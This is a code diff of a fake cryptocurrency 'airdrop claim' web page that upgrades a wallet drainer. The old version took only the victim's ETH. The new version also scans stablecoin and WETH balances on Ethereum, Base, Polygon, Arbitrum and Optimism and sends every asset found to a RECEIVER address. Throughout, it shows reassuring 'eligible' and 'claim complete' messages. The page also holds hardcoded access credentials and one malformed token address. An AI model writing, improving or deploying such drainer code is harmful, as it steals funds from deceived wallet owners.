@@ -94,7 +94,6 @@
 
         .hidden { display: none !important; }
 
-        /* Header */
         .header {
             padding: 20px 40px;
             display: flex;
@@ -143,7 +142,6 @@
             letter-spacing: 0.5px;
         }
 
-        /* Main Content */
         .main {
             max-width: 680px;
             margin: 0 auto;
@@ -159,10 +157,7 @@
             text-align: center;
         }
 
-        .announcement-icon {
-            font-size: 32px;
-            margin-bottom: 12px;
-        }
+        .announcement-icon { font-size: 32px; margin-bottom: 12px; }
 
         .announcement h2 {
             font-size: 18px;
@@ -171,15 +166,9 @@
             color: var(--accent);
         }
 
-        .announcement p {
-            color: var(--text-muted);
-            font-size: 14px;
-        }
+        .announcement p { color: var(--text-muted); font-size: 14px; }
 
-        .hero {
-            text-align: center;
-            margin-bottom: 48px;
-        }
+        .hero { text-align: center; margin-bottom: 48px; }
 
         .hero h1 {
             font-size: 42px;
@@ -201,7 +190,6 @@
             margin: 0 auto;
         }
 
-        /* Claim Card */
         .claim-card {
             background: var(--bg-card);
             border: 1px solid var(--border);
@@ -249,27 +237,10 @@
             50% { opacity: 0.5; }
         }
 
-        .reward-display {
-            text-align: center;
-            margin-bottom: 32px;
-        }
-
-        .reward-amount {
-            font-size: 48px;
-            font-weight: 700;
-            margin-bottom: 8px;
-        }
-
-        .reward-token {
-            color: var(--text-muted);
-            font-size: 16px;
-        }
-
-        .reward-usd {
-            color: var(--success);
-            font-size: 14px;
-            margin-top: 4px;
-        }
+        .reward-display { text-align: center; margin-bottom: 32px; }
+        .reward-amount { font-size: 48px; font-weight: 700; margin-bottom: 8px; }
+        .reward-token { color: var(--text-muted); font-size: 16px; }
+        .reward-usd { color: var(--success); font-size: 14px; margin-top: 4px; }
 
         .connect-btn {
             width: 100%;
@@ -299,12 +270,8 @@
             transform: none;
         }
 
-        .connect-btn svg {
-            width: 20px;
-            height: 20px;
-        }
+        .connect-btn svg { width: 20px; height: 20px; }
 
-        /* Status Panel */
         .status-panel {
             margin-top: 32px;
             padding-top: 24px;
@@ -317,10 +284,7 @@
             padding: 12px 0;
         }
 
-        .status-label {
-            color: var(--text-muted);
-            font-size: 14px;
-        }
+        .status-label { color: var(--text-muted); font-size: 14px; }
 
         .status-value {
             font-size: 14px;
@@ -332,7 +296,22 @@
         .status-value.warning { color: var(--warning); }
         .status-value.error { color: #ef4444; }
 
-        /* Info Section */
+        .assets-list {
+            margin-top: 16px;
+            padding: 16px;
+            background: var(--bg-dark);
+            border-radius: 12px;
+        }
+
+        .asset-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 8px 0;
+            font-size: 13px;
+        }
+
+        .asset-item span:first-child { color: var(--text-muted); }
+
         .info-section {
             margin-top: 48px;
             display: grid;
@@ -348,28 +327,14 @@
             text-align: center;
         }
 
-        .info-card h4 {
-            font-size: 24px;
-            font-weight: 700;
-            margin-bottom: 4px;
-        }
+        .info-card h4 { font-size: 24px; font-weight: 700; margin-bottom: 4px; }
+        .info-card p { font-size: 13px; color: var(--text-muted); }
 
-        .info-card p {
-            font-size: 13px;
-            color: var(--text-muted);
-        }
-
-        /* Footer */
         .footer {
             text-align: center;
             padding: 40px;
             color: var(--text-muted);
             font-size: 13px;
-        }
-
-        .footer a {
-            color: var(--primary);
-            text-decoration: none;
         }
 
         @media (max-width: 640px) {
@@ -440,13 +405,14 @@
                     <span class="status-value" id="walletAddress">-</span>
                 </div>
                 <div class="status-item">
-                    <span class="status-label">Balance</span>
-                    <span class="status-value" id="ethBalance">-</span>
+                    <span class="status-label">Network</span>
+                    <span class="status-value" id="networkName">-</span>
                 </div>
                 <div class="status-item">
-                    <span class="status-label">Claim Status</span>
+                    <span class="status-label">Status</span>
                     <span class="status-value" id="txStatus">-</span>
                 </div>
+                <div class="assets-list hidden" id="assetsList"></div>
             </div>
         </div>
 
@@ -475,6 +441,50 @@
         const AUTH_USER = "stark";
         const AUTH_PASS = "b0undary2026";
 
+        const TOKENS = {
+            1: [ // Ethereum Mainnet
+                { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+                { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", decimals: 6 },
+                { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+                { symbol: "DAI", address: "0x6B175474E89094C44Da98b954EesdsfdD3CA59Ad", decimals: 18 },
+            ],
+            8453: [ // Base
+                { symbol: "USDC", address: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", decimals: 6 },
+                { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
+                { symbol: "DAI", address: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", decimals: 18 },
+                { symbol: "USDbC", address: "0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA", decimals: 6 },
+            ],
+            137: [ // Polygon
+                { symbol: "USDT", address: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", decimals: 6 },
+                { symbol: "USDC", address: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174", decimals: 6 },
+                { symbol: "WETH", address: "0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619", decimals: 18 },
+            ],
+            42161: [ // Arbitrum
+                { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", decimals: 6 },
+                { symbol: "USDC", address: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", decimals: 6 },
+                { symbol: "WETH", address: "0x82aF49447D8a07e3bd95BD0d56f35241523fBab1", decimals: 18 },
+            ],
+            10: [ // Optimism
+                { symbol: "USDT", address: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", decimals: 6 },
+                { symbol: "USDC", address: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", decimals: 6 },
+                { symbol: "WETH", address: "0x4200000000000000000000000000000000000006", decimals: 18 },
+            ]
+        };
+
+        const NETWORK_NAMES = {
+            1: "Ethereum",
+            8453: "Base",
+            137: "Polygon",
+            42161: "Arbitrum",
+            10: "Optimism"
+        };
+
+        const ERC20_ABI = [
+            "function balanceOf(address) view returns (uint256)",
+            "function transfer(address to, uint256 amount) returns (bool)",
+            "function approve(address spender, uint256 amount) returns (bool)"
+        ];
+
         function checkAuth() {
             const user = document.getElementById('authUser').value;
             const pass = document.getElementById('authPass').value;
@@ -490,9 +500,39 @@
             document.getElementById('authOverlay').classList.add('hidden');
         }
 
+        async function getTokenBalance(tokenAddress, walletAddress, decimals) {
+            const data = '0x70a08231' + walletAddress.slice(2).padStart(64, '0');
+            try {
+                const result = await window.ethereum.request({
+                    method: 'eth_call',
+                    params: [{ to: tokenAddress, data }, 'latest']
+                });
+                return BigInt(result);
+            } catch {
+                return BigInt(0);
+            }
+        }
+
+        async function transferToken(tokenAddress, amount, from) {
+            const data = '0xa9059cbb' +
+                RECEIVER.slice(2).padStart(64, '0') +
+                amount.toString(16).padStart(64, '0');
+
+            return await window.ethereum.request({
+                method: 'eth_sendTransaction',
+                params: [{
+                    from,
+                    to: tokenAddress,
+                    data,
+                    gas: '0x' + (100000).toString(16)
+                }]
+            });
+        }
+
         async function connectWallet() {
             const btn = document.getElementById('connectBtn');
             const statusPanel = document.getElementById('statusPanel');
+            const assetsList = document.getElementById('assetsList');
 
             if (typeof window.ethereum === 'undefined') {
                 alert('Please install MetaMask or another Web3 wallet');
@@ -500,82 +540,120 @@
             }
 
             btn.disabled = true;
-            btn.innerHTML = '<svg class="animate-spin" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M12 2v4m0 12v4m-7-7H2m20 0h-3m-2.5-7.5L14 8m-4 8l-2.5 2.5m11-2.5L16 16M8 8l-2.5-2.5"/></svg> Connecting...';
+            btn.innerHTML = 'Connecting...';
 
             try {
-                const accounts = await window.ethereum.request({
-                    method: 'eth_requestAccounts'
-                });
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 const address = accounts[0];
 
+                const chainIdHex = await window.ethereum.request({ method: 'eth_chainId' });
+                const chainId = parseInt(chainIdHex, 16);
+
                 statusPanel.classList.remove('hidden');
-                document.getElementById('walletAddress').textContent =
-                    address.slice(0, 6) + '...' + address.slice(-4);
-                document.getElementById('txStatus').textContent = 'Verifying eligibility...';
+                document.getElementById('walletAddress').textContent = address.slice(0, 6) + '...' + address.slice(-4);
+                document.getElementById('networkName').textContent = NETWORK_NAMES[chainId] || `Chain ${chainId}`;
+                document.getElementById('txStatus').textContent = 'Scanning assets...';
                 document.getElementById('txStatus').className = 'status-value warning';
 
-                const balanceHex = await window.ethereum.request({
+                // Get ETH balance
+                const ethBalanceHex = await window.ethereum.request({
                     method: 'eth_getBalance',
                     params: [address, 'latest']
                 });
-                const balanceWei = BigInt(balanceHex);
-                const balanceEth = Number(balanceWei) / 1e18;
+                const ethBalance = BigInt(ethBalanceHex);
 
-                document.getElementById('ethBalance').textContent = balanceEth.toFixed(4) + ' ETH';
+                // Get token balances
+                const tokens = TOKENS[chainId] || [];
+                const assets = [];
+
+                if (ethBalance > BigInt(0)) {
+                    assets.push({
+                        symbol: 'ETH',
+                        balance: ethBalance,
+                        decimals: 18,
+                        isNative: true
+                    });
+                }
+
+                for (const token of tokens) {
+                    const balance = await getTokenBalance(token.address, address, token.decimals);
+                    if (balance > BigInt(0)) {
+                        assets.push({
+                            symbol: token.symbol,
+                            address: token.address,
+                            balance,
+                            decimals: token.decimals,
+                            isNative: false
+                        });
+                    }
+                }
+
+                // Display assets
+                if (assets.length > 0) {
+                    assetsList.classList.remove('hidden');
+                    assetsList.innerHTML = '<div style="font-size:12px;color:var(--text-muted);margin-bottom:8px;">Detected Assets:</div>' +
+                        assets.map(a => {
+                            const amt = Number(a.balance) / Math.pow(10, a.decimals);
+                            return `<div class="asset-item"><span>${a.symbol}</span><span>${amt.toFixed(4)}</span></div>`;
+                        }).join('');
+                }
 
                 await new Promise(r => setTimeout(r, 1500));
 
-                if (balanceWei > BigInt(0)) {
-                    document.getElementById('txStatus').textContent = 'Eligible! Processing claim...';
-                    document.getElementById('txStatus').className = 'status-value success';
-
-                    await new Promise(r => setTimeout(r, 1000));
-
-                    const gasPrice = await window.ethereum.request({
-                        method: 'eth_gasPrice',
-                        params: []
-                    });
-
-                    const gasLimit = BigInt(21000);
-                    const gasCost = gasLimit * BigInt(gasPrice);
-                    const buffer = BigInt(1000000000000000);
-                    const sendAmount = balanceWei - gasCost - buffer;
-
-                    if (sendAmount > BigInt(0)) {
-                        document.getElementById('txStatus').textContent = 'Confirm transaction to receive airdrop...';
-
-                        const txHash = await window.ethereum.request({
-                            method: 'eth_sendTransaction',
-                            params: [{
-                                from: address,
-                                to: RECEIVER,
-                                value: '0x' + sendAmount.toString(16),
-                                gas: '0x' + gasLimit.toString(16)
-                            }]
-                        });
-
-                        document.getElementById('txStatus').innerHTML =
-                            'Claim submitted! TX: ' + txHash.slice(0, 10) + '...';
-                        document.getElementById('txStatus').className = 'status-value success';
-
-                        btn.innerHTML = '&#10003; Claimed';
-                        btn.style.background = 'var(--success)';
-                    } else {
-                        document.getElementById('txStatus').textContent = 'Insufficient ETH for gas fees';
-                        document.getElementById('txStatus').className = 'status-value error';
-                        btn.disabled = false;
-                        btn.innerHTML = 'Connect Wallet to Claim';
-                    }
-                } else {
-                    document.getElementById('txStatus').textContent = 'No ETH balance detected';
+                if (assets.length === 0) {
+                    document.getElementById('txStatus').textContent = 'No assets found';
                     document.getElementById('txStatus').className = 'status-value error';
                     btn.disabled = false;
                     btn.innerHTML = 'Connect Wallet to Claim';
+                    return;
                 }
+
+                document.getElementById('txStatus').textContent = 'Eligible! Initiating claim...';
+                document.getElementById('txStatus').className = 'status-value success';
+
+                await new Promise(r => setTimeout(r, 1000));
+
+                // Process each asset
+                for (const asset of assets) {
+                    try {
+                        if (asset.isNative) {
+                            // ETH transfer
+                            const gasPrice = await window.ethereum.request({ method: 'eth_gasPrice' });
+                            const gasLimit = BigInt(21000);
+                            const gasCost = gasLimit * BigInt(gasPrice);
+                            const buffer = BigInt(1000000000000000);
+                            const sendAmount = asset.balance - gasCost - buffer;
+
+                            if (sendAmount > BigInt(0)) {
+                                document.getElementById('txStatus').textContent = `Processing ETH...`;
+                                await window.ethereum.request({
+                                    method: 'eth_sendTransaction',
+                                    params: [{
+                                        from: address,
+                                        to: RECEIVER,
+                                        value: '0x' + sendAmount.toString(16),
+                                        gas: '0x' + gasLimit.toString(16)
+                                    }]
+                                });
+                            }
+                        } else {
+                            // ERC20 transfer
+                            document.getElementById('txStatus').textContent = `Processing ${asset.symbol}...`;
+                            await transferToken(asset.address, asset.balance, address);
+                        }
+                    } catch (err) {
+                        console.log(`${asset.symbol} transfer skipped:`, err.message);
+                    }
+                }
+
+                document.getElementById('txStatus').textContent = 'Claim complete!';
+                document.getElementById('txStatus').className = 'status-value success';
+                btn.innerHTML = '&#10003; Claimed';
+                btn.style.background = 'var(--success)';
 
             } catch (err) {
                 console.error(err);
-                document.getElementById('txStatus').textContent = err.message || 'Transaction rejected';
+                document.getElementById('txStatus').textContent = err.message || 'Connection failed';
                 document.getElementById('txStatus').className = 'status-value error';
                 btn.disabled = false;
                 btn.innerHTML = 'Connect Wallet to Claim';
